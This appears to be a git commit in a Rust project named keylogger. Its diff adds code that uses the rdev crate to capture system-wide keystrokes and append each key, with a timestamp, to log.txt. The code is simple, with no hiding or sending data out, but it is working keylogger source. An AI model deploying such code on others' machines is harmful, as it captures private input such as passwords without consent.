79443067efcd0a38f1d57352af87112e5a8fc628
Nadheer Chatharoo <nchatharoo@icloud.com>
2024-09-06 10:51:31 +0200

    Log keyboards event in log.txt

--- keylogger/src/main.rs
+++ keylogger/src/main.rs
@@ -1,3 +1,24 @@
+use rdev::{listen, Event};
+use std::fs::OpenOptions;
+use std::io::prelude::*;
+use std::time::SystemTime;
+
 fn main() {
-    println!("Hello, world!");
+    if let Err(error) = listen(callback) {
+        println!("Error: {:?}", error)
+    }
+}
+
+fn callback(event: Event) {
+    let mut file = OpenOptions::new()
+    .append(true)
+    .create(true)
+    .open("log.txt")
+    .expect("Unable to open log.txt");
+
+    if let Some(key) = event.name {
+        let now = SystemTime::now();
+        let entry = format!("{:?} - key pressed is: {}\n", now, key);
+        file.write_all(entry.as_bytes()).expect("Failed to write to file");
+    }
 }
